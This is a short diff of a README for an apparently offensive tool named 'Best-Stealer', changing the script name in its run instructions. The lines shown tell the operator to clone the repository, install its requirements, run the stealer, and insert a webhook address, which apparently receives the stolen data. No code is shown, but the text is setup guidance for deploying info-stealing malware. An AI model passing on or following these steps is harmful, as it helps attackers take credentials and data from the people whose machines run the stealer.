@@ -24,7 +24,7 @@ git clone https://github.com/HatGirl-zz/Best-Stealer
 
 pip install -r requirements.txt
 
-Python StealerCrealer.py
+Python main.py
 
 First paste and save your webhook address instead of "WEBHOOK HERE"
 
